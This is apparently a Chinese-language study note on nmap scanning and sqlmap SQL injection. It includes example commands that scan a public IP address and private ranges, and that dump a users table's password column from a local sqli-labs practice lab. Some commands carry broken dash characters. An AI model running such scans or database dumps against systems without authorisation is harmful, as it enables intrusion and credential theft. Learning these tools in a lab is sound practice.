#第一种：nmap又称（脚本小子）

功能：

  1.主机发现

  2.端口扫描 ：用于扫描主机上端口状态。
nmap可以将端口识别为开放（Open）、关闭（Closed）、
过滤（Filtered）、未过滤（Unfiltered）、开放|过滤（Open|Filtered）、
关闭|过滤（Closed|Filtered)。
默认情况下，nmap会扫描1000个常用端口，可以覆盖大多数基本应用情况。

  3.版本侦测： 用于识别端口上运行的应用程序与应用版本。Nmap目前可以识别数千钟中应用的签名，
                                          检测数百种应用协议。而对于不识别的应用，
                                          Nmap默认会将应用的指纹打印出来，如果用于确知该应用程序，
                                          那么用户可以将信息提交到社区，为社区做贡献。

  4.操作系统侦测： 用于识别目标机的操作系统类型、版本编号及设备类型。
nmap目前提供了上千种操作系统或设备的指纹数据库,可以识别通用PC系统、路由器、交换机等设备类型。

实现功能的命令：

1.1扫描特定IP地址 nmap 123.58.180.7

1.2 用-vv对结果详细输出 nmap -vv 123.58.180.7

1.3 nmap 192.168.1.1/24 表示当前ip下的24位掩码主机都要
扫描，从192.168.1.1到192.168.1.254

1.4 nmap 192.168.1.* *代表通配符，一整行命令表示，扫描通配符所表示范围内所有主机

1.5 nmap IP1 IP2 … 中间用空格分隔 扫描多个目标

1.6 nmap 192.168.1.1-100 表示扫描192.168.1.1开始的100台主机

2.1 nmap -p21,22,23,80,443 192.168.1.1 扫描指定端口

2.2 nmap –p20-80 192.168.1.1 扫描指定范围内的端口

#第二种工具···sqlmap

功能：获取数据库内容

    进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限

-D   指定数据库       
-T   指定表 
-C   指定列

爆数据库步骤：读取数据库--->   读取表    ---->    读取表的列    ---->    获取内容

###实现功能的命令：
1.Python2 sqlmap.py –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –dbs //VM里直接sqlmap
2.Python2 sqlmap.py –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –current-db //当前数据库
3.Python2 sqlmap.py –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –D security – tables //爆security数据库里的所有表
4.Python2 sqlmap.py –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –D security -T users –columns //爆security数据库里 users表里的所有字段及字段类型
5.Python2 sqlmap.py –u http://127.0.0.1/sqli-labs/Less-1?id=1 –D security –T users –C password –dump // 列出security数据库里 users表中 password 字段的内容

— ###一：windows常用命令###
